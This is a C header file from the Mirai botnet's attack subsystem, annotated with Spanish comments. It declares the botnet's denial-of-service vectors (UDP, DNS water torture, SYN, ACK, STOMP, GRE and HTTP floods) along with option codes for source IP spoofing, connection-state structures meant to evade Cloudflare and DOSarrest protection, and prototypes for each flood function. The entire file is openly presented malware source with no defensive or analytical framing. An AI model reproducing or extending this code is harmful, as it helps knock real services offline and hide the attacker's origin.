/***************************************************************************
 * Archivo: attack.h
 * 
 * Descripción: Definiciones y estructuras para el sistema de ataques de Mirai
 * Este archivo define:
 * - Vectores de ataque soportados
 * - Estructuras de datos para objetivos y opciones
 * - Constantes y configuración
 * - Prototipos de funciones de ataque
 * - Estados y estructuras para ataques HTTP
 *
 * Parte del proyecto Mirai botnet
 * Referencias:
 * - RFC 791 (IP), RFC 793 (TCP), RFC 768 (UDP)
 * - RFC 2616 (HTTP)
 ***************************************************************************/

#pragma once

/* Cabeceras del sistema */
#include <time.h>       /* time_t, estructura time */
#include <arpa/inet.h>  /* inet_addr(), sockaddr_in */
#include <linux/ip.h>   /* struct iphdr */
#include <linux/udp.h>  /* struct udphdr */
#include <linux/tcp.h>  /* struct tcphdr */

/* Cabeceras locales */
#include "includes.h"   /* Definiciones comunes */
#include "protocol.h"   /* Constantes de protocolos */

/* Número máximo de ataques concurrentes permitidos */
#define ATTACK_CONCURRENT_MAX   8

/* Límites de conexiones HTTP según modo de compilación */
#ifdef DEBUG
#define HTTP_CONNECTION_MAX     1000    /* Más conexiones en modo debug */
#else
#define HTTP_CONNECTION_MAX     256     /* Límite normal en producción */
#endif

/**
 * Estructura que define un objetivo de ataque
 * 
 * Contiene la información necesaria para identificar y atacar un host:
 * - Estructura de socket para conexión
 * - Dirección IPv4 del objetivo
 * - Máscara de red (permite atacar subredes)
 */
struct attack_target {
    struct sockaddr_in sock_addr;  /* Estructura para conexión del socket */
    ipv4_t addr;                   /* Dirección IPv4 del objetivo */
    uint8_t netmask;               /* Máscara de subred (0-32) */
};

/**
 * Estructura para opciones de configuración de ataque
 * 
 * Almacena pares clave-valor para configurar el ataque:
 * - val: Valor de la opción como string
 * - key: Identificador numérico de la opción
 */
struct attack_option {
    char *val;        /* Valor de la opción */
    uint8_t key;      /* Clave/ID de la opción */
};

/* Tipo de función para implementar un ataque
 * Parámetros:
 * uint8_t: Número de objetivos
 * attack_target*: Array de objetivos
 * uint8_t: Número de opciones
 * attack_option*: Array de opciones
 */
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);

/* Tipo para identificar vectores de ataque
 * Cada vector es un número único que identifica un tipo de ataque
 */
typedef uint8_t ATTACK_VECTOR;

/* 
 * Definición de vectores de ataque disponibles
 * Cada vector representa un tipo específico de ataque con su propia implementación
 */

/* Ataques basados en UDP */
#define ATK_VEC_UDP        0   /* Inundación UDP básica con cabeceras personalizadas */
#define ATK_VEC_VSE        1   /* Ataque a servidores Valve Source Engine */
#define ATK_VEC_DNS        2   /* Ataque de amplificación DNS (water torture) */
#define ATK_VEC_UDP_PLAIN  9   /* Inundación UDP simple optimizada para velocidad */

/* Ataques basados en TCP */
#define ATK_VEC_SYN        3   /* Inundación SYN con opciones personalizables */
#define ATK_VEC_ACK        4   /* Inundación de paquetes ACK */
#define ATK_VEC_STOMP      5   /* Flood ACK especial para evadir mitigación */

/* Ataques basados en GRE (Generic Routing Encapsulation) */
#define ATK_VEC_GREIP      6   /* Inundación GRE encapsulando IP */
#define ATK_VEC_GREETH     7   /* Inundación GRE encapsulando Ethernet */

/* Ataques de capa de aplicación */
//#define ATK_VEC_PROXY      8   /* Ataque de conexión proxy knockback (deshabilitado) */
#define ATK_VEC_HTTP       10  /* Inundación HTTP capa 7 */

/*
 * Opciones de configuración para los ataques
 * Cada opción controla un aspecto específico del ataque
 */

/* Opciones de payload */
#define ATK_OPT_PAYLOAD_SIZE    0   /* Tamaño del payload en bytes */
#define ATK_OPT_PAYLOAD_RAND    1   /* Payload aleatorio (1) o fijo (0) */

/* Opciones de cabecera IP */
#define ATK_OPT_IP_TOS          2   /* Campo Type of Service en IP */
#define ATK_OPT_IP_IDENT        3   /* Campo Identification en IP */
#define ATK_OPT_IP_TTL          4   /* Campo Time to Live en IP */
#define ATK_OPT_IP_DF           5   /* Bit Don't Fragment en IP */

/* Opciones de puertos */
#define ATK_OPT_SPORT           6   /* Puerto origen (0 = aleatorio) */
#define ATK_OPT_DPORT           7   /* Puerto destino (0 = aleatorio) */

/* Opciones DNS */
#define ATK_OPT_DOMAIN          8   /* Nombre de dominio para ataque DNS */
#define ATK_OPT_DNS_HDR_ID      9   /* ID de cabecera DNS */

/* Control de congestión TCP (deshabilitado) */
//#define ATK_OPT_TCPCC         10  /* Control de congestión TCP */

/* Flags TCP */
#define ATK_OPT_URG             11  /* Flag URG en TCP */
#define ATK_OPT_ACK             12  /* Flag ACK en TCP */
#define ATK_OPT_PSH             13  /* Flag PSH en TCP */
#define ATK_OPT_RST             14  /* Flag RST en TCP */
#define ATK_OPT_SYN             15  /* Flag SYN en TCP */
#define ATK_OPT_FIN             16  /* Flag FIN en TCP */

/* Números de secuencia TCP */
#define ATK_OPT_SEQRND          17  /* Número de secuencia forzado */
#define ATK_OPT_ACKRND          18  /* Número de ACK forzado */

/* Opciones GRE */
#define ATK_OPT_GRE_CONSTIP     19  /* IP destino GRE igual al objetivo */

/* Opciones HTTP */
#define ATK_OPT_METHOD          20  /* Método HTTP (GET, POST, etc) */
#define ATK_OPT_POST_DATA       21  /* Datos para POST */
#define ATK_OPT_PATH            22  /* Ruta para petición HTTP */
#define ATK_OPT_HTTPS           23  /* Usar HTTPS (SSL/TLS) */
#define ATK_OPT_CONNS           24  /* Número de conexiones a usar */

/* Otras opciones */
#define ATK_OPT_SOURCE          25  /* IP origen para spoofing */

/**
 * Estructura que define un método de ataque
 * 
 * Asocia:
 * - Una función de implementación del ataque
 * - El vector/tipo de ataque correspondiente
 */
struct attack_method {
    ATTACK_FUNC func;      /* Puntero a la función que implementa el ataque */
    ATTACK_VECTOR vector;  /* Identificador del tipo de ataque */
};

/**
 * Estructura para datos específicos del ataque TCP STOMP
 * 
 * Almacena información necesaria para:
 * - Rastrear conexiones TCP
 * - Mantener estado de secuencias
 * - Control de puertos
 */
struct attack_stomp_data {
    ipv4_t addr;               /* Dirección IP del objetivo */
    uint32_t seq, ack_seq;     /* Números de secuencia y ACK */
    port_t sport, dport;       /* Puertos origen y destino */
};

/*
 * Estados de conexión para ataque HTTP
 * Define el ciclo de vida completo de una conexión HTTP
 */

#define HTTP_CONN_INIT          0  /* Estado inicial de la conexión */
#define HTTP_CONN_RESTART       1  /* Programado para reiniciar en siguiente ciclo */
#define HTTP_CONN_CONNECTING    2  /* Esperando que se establezca la conexión */
#define HTTP_CONN_HTTPS_STUFF   3  /* Manejando negociación SSL/TLS si es necesario */
#define HTTP_CONN_SEND          4  /* Enviando petición HTTP inicial */
#define HTTP_CONN_SEND_HEADERS  5  /* Enviando cabeceras HTTP */
#define HTTP_CONN_RECV_HEADER   6  /* Recibiendo y procesando cabeceras (location/cookies) */
#define HTTP_CONN_RECV_BODY     7  /* Recibiendo cuerpo y verificando modo cf iaua */
#define HTTP_CONN_SEND_JUNK     8  /* Enviando máxima cantidad de datos basura */
#define HTTP_CONN_SNDBUF_WAIT   9  /* Esperando que el socket esté disponible para escritura */
#define HTTP_CONN_QUEUE_RESTART 10 /* Reiniciar conexión después de leer datos pendientes */
#define HTTP_CONN_CLOSED        11 /* Conexión cerrada, proceder al siguiente objetivo */

/* 
 * Constantes para ataque HTTP 
 */

/* Tamaños de buffer y límites */
#define HTTP_RDBUF_SIZE         1024    /* Tamaño del buffer de lectura */
#define HTTP_HACK_DRAIN         64      /* Tamaño de drenaje para anti-detección */
#define HTTP_PATH_MAX           256     /* Longitud máxima de ruta URL */
#define HTTP_DOMAIN_MAX         128     /* Longitud máxima de dominio */
#define HTTP_COOKIE_MAX         5       /* Máximo número de cookies rastreadas */
#define HTTP_COOKIE_LEN_MAX     128     /* Longitud máxima por cookie */
#define HTTP_POST_MAX           512     /* Longitud máxima de datos POST */

/* Tipos de protección detectados */
#define HTTP_PROT_DOSARREST     1      /* Servidor protegido por DOSarrest */
#define HTTP_PROT_CLOUDFLARE    2      /* Servidor protegido por Cloudflare */

/**
 * Estructura que mantiene el estado de una conexión HTTP
 * 
 * Almacena toda la información necesaria para:
 * - Manejar la conexión
 * - Rastrear el estado
 * - Mantener buffers
 * - Gestionar cookies y datos
 * - Controlar tiempos
 * - Manejar protecciones anti-DDoS
 */
struct attack_http_state {
    /* Datos básicos de conexión */
    int fd;                             /* File descriptor del socket */
    uint8_t state;                      /* Estado actual de la conexión */
    int last_recv;                      /* Timestamp última recepción */
    int last_send;                      /* Timestamp último envío */
    ipv4_t dst_addr;                    /* Dirección IP destino */

    /* Datos de la petición HTTP */
    char user_agent[512];               /* User-Agent a utilizar */
    char path[HTTP_PATH_MAX + 1];       /* Ruta URL solicitada */
    char domain[HTTP_DOMAIN_MAX + 1];   /* Dominio objetivo */
    char postdata[HTTP_POST_MAX + 1];   /* Datos para petición POST */
    char method[9];                     /* Método HTTP actual */
    char orig_method[9];                /* Método HTTP original */

    /* Control de protecciones */
    int protection_type;                /* Tipo de protección detectada */

    /* Control de conexión */
    int keepalive;                      /* Usar conexión persistente */
    int chunked;                        /* Respuesta usa chunked encoding */
    int content_length;                 /* Longitud de contenido esperada */

    /* Gestión de cookies */
    int num_cookies;                    /* Número de cookies activas */
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX]; /* Array de cookies */

    /* Buffer de lectura */
    int rdbuf_pos;                      /* Posición actual en buffer */
    char rdbuf[HTTP_RDBUF_SIZE];       /* Buffer de lectura */
};

/**
 * Estructura para ataque específico contra Cloudflare
 * 
 * Mantiene estado de una conexión diseñada para:
 * - Evadir protección de Cloudflare
 * - Mantener la conexión viva
 * - Enviar datos de forma controlada
 */
struct attack_cfnull_state {
    /* Datos de conexión */
    int fd;                            /* File descriptor del socket */
    uint8_t state;                     /* Estado de la conexión */
    int last_recv;                     /* Timestamp última recepción */
    int last_send;                     /* Timestamp último envío */
    ipv4_t dst_addr;                   /* IP destino */
    
    /* Datos HTTP */
    char user_agent[512];              /* User-Agent personalizado */
    char domain[HTTP_DOMAIN_MAX + 1];  /* Dominio objetivo */
    int to_send;                       /* Bytes pendientes de enviar */
};

/*
 * Prototipos de funciones públicas para gestión de ataques
 */

/* Funciones principales */
BOOL attack_init(void);                /* Inicializa el subsistema de ataques */
void attack_kill_all(void);            /* Termina todos los ataques activos */
void attack_parse(char *, int);        /* Parsea un comando de ataque recibido */
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, 
                 uint8_t, struct attack_option *); /* Inicia un nuevo ataque */

/* Funciones de utilidad */
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);    /* Obtiene opción como string */
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);         /* Obtiene opción como entero */
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);/* Obtiene opción como IP */

/* 
 * Implementaciones de ataques específicos
 */

/* Ataques UDP */
void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *); /* UDP genérico */
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);     /* VSE flood */
void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);     /* DNS amplification */
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);   /* UDP simple */

/* Ataques TCP */
void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);     /* SYN flood */
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);     /* ACK flood */
void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);   /* TCP STOMP */

/* Ataques GRE */
void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);      /* GRE/IP flood */
void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);     /* GRE/ETH flood */

/* Ataques de aplicación */
void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);   /* Proxy flood */
void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);    /* HTTP flood */

/* Funciones auxiliares */
static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);     /* Registra un nuevo método de ataque */
static void free_opts(struct attack_option *, int);     /* Libera memoria de opciones */
